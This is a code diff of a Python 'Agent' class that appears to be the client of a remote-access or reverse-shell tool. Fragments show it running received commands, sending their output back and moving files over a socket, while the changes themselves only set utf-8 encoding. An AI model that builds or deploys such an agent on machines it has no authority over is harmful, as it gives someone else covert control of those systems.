@@ -21,7 +21,7 @@ class Agent:
 
     # GENERATE PROMPT =====
     def generatePrompt(self):
-        username      = subprocess.check_output(["whoami"]).decode()
+        username      = subprocess.check_output(["whoami"]).decode("utf-8")
         curWorkingDir = os.getcwd()
         prompt        = ""
 
@@ -36,7 +36,7 @@ class Agent:
     def sendData(self, data):
         jsonData = json.dumps(data)
 
-        self.localSocket.send(jsonData.encode())
+        self.localSocket.send(jsonData.encode("utf-8"))
     # END OF sendData METHOD
 
     # RECEIVE DATA =====
@@ -45,7 +45,7 @@ class Agent:
 
         while (True):
             try:
-                jsonData += self.localSocket.recv(self.bufferSize).decode()
+                jsonData += self.localSocket.recv(self.bufferSize).decode("utf-8")
 
                 return json.loads(jsonData)
 
@@ -59,7 +59,7 @@ class Agent:
         data    = file.read()
         dataLen = len(data)
 
-        self.localSocket.send(str(dataLen).encode())
+        self.localSocket.send(str(dataLen).encode("utf-8"))
         confirmMsg = self.localSocket.recv(2)
         
         self.localSocket.sendall(data)
@@ -78,7 +78,7 @@ class Agent:
             elif (self.operatingSys == "Unix")   : destination = filePath.split("/")[-1]
         elif (len(cmd_list) == 3): destination = cmd_list[-1]
 
-        dataSize = int(self.localSocket.recv(self.bufferSize).decode())
+        dataSize = int(self.localSocket.recv(self.bufferSize).decode("utf-8"))
         self.localSocket.send(b"OK")
         
         file      = open(destination, "wb")
@@ -148,8 +148,8 @@ class Agent:
 
                 if (returnCode == 0):
                     if (output == b""): result = "[+] Command executed successfully\n"
-                    else:               result = output.decode()
-                elif (returnCode == 1): result = error.decode()
+                    else:               result = output.decode("utf-8")
+                elif (returnCode == 1): result = error.decode("utf-8")
 
         except subprocess.TimeoutExpired:
             result = "[!] Command timed out\n"
